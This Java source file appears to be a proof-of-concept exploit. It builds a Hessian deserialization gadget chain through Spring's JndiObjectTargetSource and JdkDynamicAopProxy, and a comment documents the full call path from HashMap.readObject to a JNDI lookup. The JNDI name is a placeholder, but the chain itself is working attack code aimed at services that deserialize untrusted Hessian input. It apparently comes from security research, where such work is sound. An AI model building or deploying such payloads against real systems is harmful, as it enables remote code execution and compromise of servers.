package com.example.Spring;

import com.example.Utils.HessianUtil;
import com.example.Utils.ReflectionUtil;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.jndi.JndiObjectTargetSource;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class POC_1 {

    /***
     * <java.util.HashMap: void readObject(java.io.ObjectInputStream)>
     * <java.util.HashMap: int hash(java.lang.Object)>
     * <org.springframework.aop.framework.JdkDynamicAopProxy: java.lang.Object invoke(java.lang.Object,java.lang.reflect.Method,java.lang.Object[])>
     * <org.springframework.jndi.JndiObjectTargetSource: java.lang.Object getTarget()>
     * <org.springframework.jndi.JndiObjectLocator: java.lang.Object lookup()>
     * <org.springframework.jndi.JndiLocatorSupport: java.lang.Object lookup(java.lang.String,java.lang.Class)>
     * <org.springframework.jndi.JndiTemplate: java.lang.Object lookup(java.lang.String)>
     */

    public static void main(String[] args) throws Exception {
        JndiObjectTargetSource source = new JndiObjectTargetSource();
        source.setJndiName("xxx");
        source.setLookupOnStartup(false);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTargetSource(source);

        InvocationHandler handler = (InvocationHandler) ReflectionUtil.createObject("org.springframework.aop.framework.JdkDynamicAopProxy",
                new Class[]{org.springframework.aop.framework.AdvisedSupport.class},
                new Object[]{advisedSupport});
        Map m = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class<?>[]{Map.class}, handler);
        HashMap map = ReflectionUtil.makeMap(m);

        HessianUtil.deserialize(HessianUtil.serialize(map));
    }

}
